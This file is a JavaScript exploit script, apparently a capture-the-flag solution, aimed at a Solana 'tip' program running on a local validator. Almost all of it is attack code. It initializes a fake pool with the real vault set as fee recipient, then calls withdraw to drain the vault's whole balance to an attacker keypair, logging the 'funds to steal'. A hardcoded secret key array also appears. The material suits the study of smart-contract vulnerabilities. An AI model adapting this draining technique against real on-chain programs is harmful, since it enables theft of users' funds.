const {
  Keypair,
  Transaction,
  LAMPORTS_PER_SOL,
  Connection,
  sendAndConfirmTransaction,
  PublicKey,
} = require("@solana/web3.js");

const bs58 = require("bs58");
const { Tip } = require("tip");
const { Exploit } = require("exploit");

const authorityPublicKey = new PublicKey(
  bs58.decode("7By5EKRWGRKD5eQSh582u3QPcyuYRi7Me5UHzJ4hvru4")
);
const tipProgramId = new PublicKey(
  bs58.decode("8fD3hLsYTBsHT8oroa7MQnM2YojitNic7fVLvVJRLSWY")
);

console.log(`[*] Authority: ${authorityPublicKey}`);
console.log(`[*] Tip: ${tipProgramId}`);

const connection = new Connection("http://localhost:8899", "confirmed");

// initialize attacker's keys
let attackerSecretKey = Uint8Array.from([
  61, 234, 218, 250, 91, 105, 201, 10, 169, 51, 137, 21, 23, 228, 162, 2, 4, 48,
  158, 95, 41, 153, 14, 78, 38, 72, 140, 218, 108, 69, 149, 213, 91, 248, 110,
  163, 191, 97, 101, 129, 245, 158, 22, 200, 191, 11, 23, 166, 6, 179, 225, 153,
  169, 233, 223, 178, 24, 145, 185, 167, 217, 137, 141, 54,
]);
//let attacker = Keypair.fromSecretKey(attackerSecretKey);
let attacker = Keypair.generate();

(async () => {
  // receive 'tiny' airdrop
  {
    const sig = await connection.requestAirdrop(
      attacker.publicKey,
      1.0 * LAMPORTS_PER_SOL
    );
    await connection.confirmTransaction({ signature: sig });
  }

  const balancePrev = await connection.getBalance(attacker.publicKey);
  console.log(
    `[*] Previous balance of attacker: ${balancePrev / LAMPORTS_PER_SOL} SOL`
  );

  const [vaultAddress, _walletBumpSeed] = PublicKey.findProgramAddressSync(
    [],
    tipProgramId
  );

  const withdrawAmount = await connection.getBalance(vaultAddress);
  console.log(
    `[*] Amount of funds to steal: ${withdrawAmount / LAMPORTS_PER_SOL} SOL`
  );

  {
    // initialize a new vault, whose fee recipient is the 'real' vault and fee is the amount to withdraw
    const [ix1, fakePoolAddress] = Tip.initializeWithSeed(
      tipProgramId,
      0x2f,
      attacker.publicKey,
      Exploit.packInt64(withdrawAmount),
      vaultAddress
    );
    let tx1 = new Transaction().add(ix1);
    await sendAndConfirmTransaction(connection, tx1, [attacker]);
    console.log(`[+] Created a new fake pool at ${fakePoolAddress}`);

    // by using that pool, drain funds
    const ix2 = Tip.withdraw(
      tipProgramId,
      vaultAddress,
      fakePoolAddress,
      attacker.publicKey,
      withdrawAmount
    );
    let tx2 = new Transaction().add(ix2);
    await sendAndConfirmTransaction(connection, tx2, [attacker]);
  }

  const balanceFinal = await connection.getBalance(attacker.publicKey);
  console.log(
    `[*] Final balance of attacker: ${balanceFinal / LAMPORTS_PER_SOL} SOL`
  );
})();
